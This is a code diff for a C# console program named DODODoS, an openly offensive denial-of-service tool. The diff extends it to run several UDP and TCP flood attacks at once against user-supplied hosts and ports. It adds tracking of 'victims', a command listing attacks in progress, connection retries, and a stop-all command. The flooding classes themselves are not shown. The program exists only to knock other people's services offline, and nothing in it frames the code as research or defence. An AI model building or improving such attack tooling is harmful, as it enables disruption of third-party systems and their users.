@@ -1,6 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -9,8 +9,9 @@ namespace DODODoS
     class Program
     {
         static Dictionary<String, Action> cmd;
-        static DODODoS.UDP UDPvictim = new DODODoS.UDP();
-        static DODODoS.TCP TCPvictim = new DODODoS.TCP();
+
+        static List<Tuple<string, UDP>> UdpVictims = new List<Tuple<string, UDP>>();
+        static List<Tuple<string, TCP>> TcpVictims = new List<Tuple<string, TCP>>();
         static void Main(string[] args)
         {
             bool exit = true;
@@ -44,14 +45,23 @@ namespace DODODoS
             cmd.Add("udp", new Action(UDP));
             cmd.Add("tcp", new Action(TCP));
             cmd.Add("stop", new Action(Stop));
+            cmd.Add("list", new Action(List));
+            cmd.Add("clear", new Action(Clear));
             cmd.Add("help", new Action(Help));
             cmd.Add("exit", new Action(Exit));
         }
 
         static void Exit()
         {
+            Stop();
             Environment.Exit(0);
         }
+
+        static void Clear()
+        {
+            Console.Clear();
+        }
+
         /// <summary>
         /// Prints the list of commands
         /// </summary>
@@ -64,6 +74,27 @@ namespace DODODoS
             }
         }
 
+        static void List()
+        {
+            if (UdpVictims.Count > 0)
+            {
+                Console.WriteLine("UDP attacks:");
+                foreach (Tuple<string, UDP> victim in UdpVictims)
+                    Console.WriteLine("   {0}", victim.Item1);
+            }
+            else
+                Console.WriteLine("No UDP attacks in progress.");
+
+            if (TcpVictims.Count > 0)
+            {
+            Console.WriteLine("TCP attacks:");
+            foreach (Tuple<string, TCP> victim in TcpVictims)
+                Console.WriteLine("   {0}", victim.Item1);
+            }
+            else
+                Console.WriteLine("No TCP attacks in progress.");
+        }
+
         /// <summary>
         /// Starts a UDP attack
         /// </summary>
@@ -73,9 +104,9 @@ namespace DODODoS
             int port;
             byte[] message;
             Collect(out host, out port, out message);
-            UDPvictim = new DODODoS.UDP();
-            UDPvictim.Connect(host, port);
-            UDPvictim.Attack(message, Environment.ProcessorCount * 2);
+            UdpVictims.Insert(0, new Tuple<string, UDP>(host + ":" + port, new UDP()));
+            UdpVictims[0].Item2.Connect(host, port);
+            UdpVictims[0].Item2.Attack(message, Environment.ProcessorCount * 2);
         }
 
         /// <summary>
@@ -86,10 +117,22 @@ namespace DODODoS
             string host;
             int port;
             byte[] message;
+            TCP t;
             Collect(out host, out port, out message);
-            TCPvictim = new DODODoS.TCP();
-            TCPvictim.Connect(host, port);
-            TCPvictim.Attack(message, Environment.ProcessorCount * 2);
+            
+            t = new TCP();
+            bool conn = t.Connect(host, port);
+
+            for (int i = 0; i < 5 && !conn; i++)
+            {
+                Console.WriteLine("Can't connect. Retrying...");
+                conn = t.Connect(host, port);
+            }
+            if (conn)
+            {
+                TcpVictims.Insert(0, new Tuple<string, TCP>(host + ":" + port, t));
+                TcpVictims[0].Item2.Attack(message, Environment.ProcessorCount * 2);
+            }
         }
 
         /// <summary>
@@ -97,10 +140,13 @@ namespace DODODoS
         /// </summary>
         static void Stop()
         {
-            if (UDPvictim.IsRunning)
-                UDPvictim.Stop();
-            if(TCPvictim.IsRunning)
-                TCPvictim.Stop();
+            foreach (Tuple<string, UDP> victim in UdpVictims)
+                victim.Item2.Stop();
+            foreach (Tuple<string, TCP> victim in TcpVictims)
+                victim.Item2.Stop();
+            UdpVictims.Clear();
+            TcpVictims.Clear();
+            Console.WriteLine("Attacks stopped succesfully.");
         }
 
         /// <summary>
